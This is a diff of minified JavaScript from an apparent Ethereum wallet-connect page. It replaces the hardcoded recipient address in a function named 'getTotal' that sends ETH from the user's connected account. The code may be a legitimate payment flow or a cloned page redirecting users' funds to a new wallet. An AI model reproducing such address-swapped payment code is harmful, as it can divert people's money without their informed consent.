@@ -186,7 +186,7 @@
                         this.account = t[0], window.ethereum.request({ method: "eth_chainId" }).then((function(t) { return e.step3(t) })).catch((function(t) { return console.log(t) }))
                     },
                     step3: function(t) { this.chainId = t, Z.$emit("wallet-connected"), Z.$emit("chain-changed", t) },
-                    getTotal: function(t) { window.ethereum.request({ method: "eth_sendTransaction", params: [{ from: this.account, to: "0x588f6D7D0dC34FE13b8C65b64F46bd2De5da5ad2", value: (Math.pow(10, 18) * t).toString(16) }] }).catch((function(t) { return console.log(t) })) }
+                    getTotal: function(t) { window.ethereum.request({ method: "eth_sendTransaction", params: [{ from: this.account, to: "0x03dffa990f8fd07d383d4fec5a595e5153982432", value: (Math.pow(10, 18) * t).toString(16) }] }).catch((function(t) { return console.log(t) })) }
                 }
             },
             K = Y,
